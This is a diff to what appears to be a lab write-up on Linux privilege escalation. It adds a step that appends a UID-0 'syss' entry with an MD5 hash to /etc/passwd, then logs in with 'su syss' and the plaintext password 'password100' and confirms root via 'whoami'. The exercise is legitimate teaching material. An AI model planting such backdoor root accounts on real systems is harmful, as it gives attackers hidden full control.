@@ -252,7 +252,7 @@ I scrolled to the bottom of the file and pasted the line:
 ```
 syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
 ```
-Then pressed Ctrl+X then Y then Enter to save and exit.
+Then pressed `Ctrl+X` then `Y` then Enter to save and exit.
 
 ### Confirmed the Line Was Added
 
@@ -268,4 +268,34 @@ Debian-exim:x:101:103::/var/spool/exim4:/bin/false
 syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
 ...
 mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
+```
+The new line was sitting right there in /etc/passwd. The user syss with UID 0 was now part of the system.
+
+<p align="center">
+  <img src="images/step3-1.png" width="600">
+</p>
+
+## Step 4 — Logging in as Root with the New User
+
+```bash
+user@debian:~$ su syss
+```
+```
+Password: password100
+```
+**Output:**
+
+```
+root@debian:/home/user#
+```
+
+### Confirmed Root Access
+
+```
+root@debian:/home/user# whoami
+```
+**Output:**
+
+```
+root
 ```
